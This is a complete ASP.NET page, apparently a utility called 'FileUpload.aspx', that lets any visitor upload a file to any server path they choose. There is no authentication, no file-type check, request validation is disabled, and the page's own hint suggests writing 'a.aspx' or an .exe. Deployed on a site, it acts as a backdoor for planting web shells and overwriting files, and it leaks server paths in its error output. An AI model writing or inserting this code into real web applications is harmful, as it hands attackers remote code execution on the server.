<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>

<!DOCTYPE html  >
<html>
<head>

    <title>FileUpload.aspx V1[Lith 180929]</title>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            string strOutput = "\r\n\r\n";

            if (!fileUpload.HasFile)
            {
                outPut.Text = strOutput+"请选择要上传的文件!";
                return;
            }

            try
            {
                string fileName = Request["filePath"];

                if(string.IsNullOrEmpty(fileName))
                    fileName = fileUpload.PostedFile.FileName;

                string fileAllPath;
                if (System.IO.Path.IsPathRooted(fileName))
                {
                    fileAllPath = fileName;
                }
                else
                {
                    fileAllPath = Server.MapPath("~/"+fileName);
                }
 
                fileUpload.SaveAs(fileAllPath);
         
                strOutput += "\r\n上传成功!文件路径：\r\n" + fileAllPath;

                filePath.Value = Request["filePath"];
            }
            catch (Exception ex)
            {
                strOutput += ex.GetBaseException().Message;
            }
            outPut.Text = strOutput;
        }
    </script>
</head>
<body>
    <form runat="server">
        <div>
            <input type="submit" />
        </div>       
        <div> 
             <asp:FileUpload ID="fileUpload" runat="server" /> 
        </div>
        filePath: 若不指定则使用原始文件名。例 "a.aspx"  "D:\\Code\run.exe"
        <div> 
            <textarea runat="server" id="filePath" rows="1" cols="150"  ></textarea>
        </div>
        return:
        <div>
            <textarea rows="20" cols="150">
                <asp:Literal ID="outPut" runat="server" />
            </textarea>
        </div>
    </form>
</body>
</html>

